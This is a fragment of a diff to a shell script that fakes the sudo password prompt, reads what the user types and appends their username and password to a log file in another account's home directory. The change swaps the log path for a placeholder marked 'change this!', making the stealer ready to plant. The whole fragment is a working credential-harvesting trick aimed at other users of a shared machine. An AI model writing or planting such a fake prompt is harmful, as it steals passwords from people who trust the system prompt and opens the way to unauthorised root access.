@@ -7,6 +7,6 @@ echo "[sudo] password for $USER: "
 read password
 
 #logs username and password to a file
-echo "$USER - sudu password: $password" >> /home/anotheruser/log
+echo "$USER - sudu password: $password" >> /home/<YOURUSERNAME>/log   #change this!
 
 exit
